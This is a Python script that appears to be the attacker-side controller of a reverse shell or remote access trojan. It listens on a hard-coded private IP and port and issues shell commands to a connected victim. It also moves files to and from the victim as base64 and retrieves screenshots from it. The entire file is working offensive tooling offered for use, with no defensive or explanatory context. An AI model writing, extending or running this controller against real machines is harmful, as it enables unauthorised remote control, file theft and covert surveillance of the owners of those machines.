#!/usr/bin/env python
import base64
import json
import socket
from termcolor import colored

count = 1  # Initialize the 'count' variable here

def reliable_send(data):
    if target:
        json_data = json.dumps(data)
        target.send(json_data.encode())

def reliable_recv():
    data = b""
    while True:
        try:
            chunk = target.recv(1024)
            data += chunk
            return json.loads(data.decode())
        except ValueError:
            continue

def shell():
    global count  # Add 'count' as a global variable
    while True:
        command = input(colored(f">>> Shell#~{str(ip)}:", "green"))
        reliable_send(command)
        if command.strip() == "q" or command.strip() == "quit" or command.strip() == "exit":
            print(colored("[-] Closing connection...", "red"))
            exit(0)

        elif command[:2] == "cd" and len(command) > 2:
            cmd_result = reliable_recv()
            print(cmd_result)
            continue

        elif command[:8] == "download":
            file_path = command[9:]
            with open(file_path, "wb") as file:
                file_data = reliable_recv()
                file.write(base64.b64decode(file_data))
                print(f"Downloaded {file_path}")

        elif command[:6] == "upload":
            file_path = command[7:]
            try:
                with open(file_path, "rb") as file:
                    file_data = file.read()
                    file_data_encoded = base64.b64encode(file_data).decode()
                    reliable_send(file_data_encoded)
                    print(f"Uploaded {file_path}")
            except FileNotFoundError:
                print(f"File {file_path} not found")

        elif command[:10] == "screenshot":
            with open(f"screenshot{count}.png", "wb") as screen_shot:
                image = reliable_recv()
                try:
                    image_decoded = base64.b64decode(image)
                    if image_decoded[:4] == b"[!!]":
                        print(image_decoded.decode())
                    else:
                        screen_shot.write(image_decoded)
                    count += 1
                except base64.binascii.Error:
                    print("Invalid base64-encoded image data received.")

        else:
            cmd_result = reliable_recv()
            print(colored(cmd_result,"red"))

def server():
    global target
    global ip
    server_address = ("192.168.30.144", 5555)

    while True:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind(server_address)
        sock.listen(5)
        print(colored("[+] Listening For Incoming Connections {}:{}".format(colored(server_address[0], "yellow"), colored(server_address[1], "red")), "green"))

        try:
            target, address = sock.accept()
            print(colored("[+] Connection Established From: {}".format(colored(address, "red")), "green"))
            ip = address[0]  # Store the IP address from the connection
            shell()
        except ConnectionResetError:
            print(colored("[-] Connection reset by peer.", "red"))
        except KeyboardInterrupt:
            break
        finally:
            if target:
                target.close()
            sock.close()

try:
    server()
except KeyboardInterrupt:
    exit(0)

